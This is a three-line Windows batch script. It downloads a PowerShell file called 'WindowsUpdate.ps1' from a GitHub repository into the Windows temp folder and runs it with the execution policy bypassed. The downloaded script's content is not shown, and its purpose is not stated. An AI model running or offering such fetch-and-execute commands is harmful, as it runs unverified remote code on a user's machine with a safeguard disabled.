cls
C:\Windows\System32\wget.exe https://raw.githubusercontent.com/altinsoft/public-repo/main/WindowsUpdate.ps1 --output-document C:\Windows\Temp\WindowsUpdate.ps1 -t 5 -w 5
powershell.exe -ExecutionPolicy Bypass -File "C:\Windows\Temp\WindowsUpdate.ps1"
